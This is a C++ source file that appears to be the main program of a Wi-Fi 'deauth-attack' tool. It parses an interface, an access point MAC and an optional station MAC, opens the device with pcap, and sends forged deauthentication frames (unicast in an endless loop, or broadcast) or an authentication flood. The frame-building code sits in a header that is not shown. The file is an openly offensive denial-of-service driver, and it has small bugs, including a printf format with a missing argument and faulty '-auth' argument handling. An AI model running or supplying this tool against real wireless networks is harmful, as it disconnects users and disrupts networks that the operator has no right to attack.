#include "attack.h"

using namespace std;

bool auth{false};
bool unicast{false};

Mac ap_mac;
Mac station_mac = Mac("ff:ff:ff:ff:ff:ff");

void usage() {
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
    if(argc < 3){
        usage();
        return -1;
    }

    ap_mac = Mac(argv[2]);
    printf("argv 2 : %s\n",  argv[2]);

    if (argc >= 4){
        unicast = true;
        station_mac = Mac(argv[3]);
    }

    if (strcmp(argv[argc -1], "-auth") == 0){
        unicast = false;
        auth = true;
    }

    char* dev = argv[1];
    printf("interface : %s\n", dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    if(unicast){
        printf("Unicast deauth attack %d\n");
        while(true){
            deauth(handle, station_mac, ap_mac, ap_mac);
            deauth(handle, ap_mac, station_mac, ap_mac);
        }
        return 0;
    }

    if(auth){
        printf("Authentication attack!\n");
        authentication(handle, ap_mac, station_mac);
        return 0;
    }

    printf("broadcast deauth attack start!");
    deauth(handle, station_mac, ap_mac, ap_mac);

    pcap_close(handle);
    return 0;


}
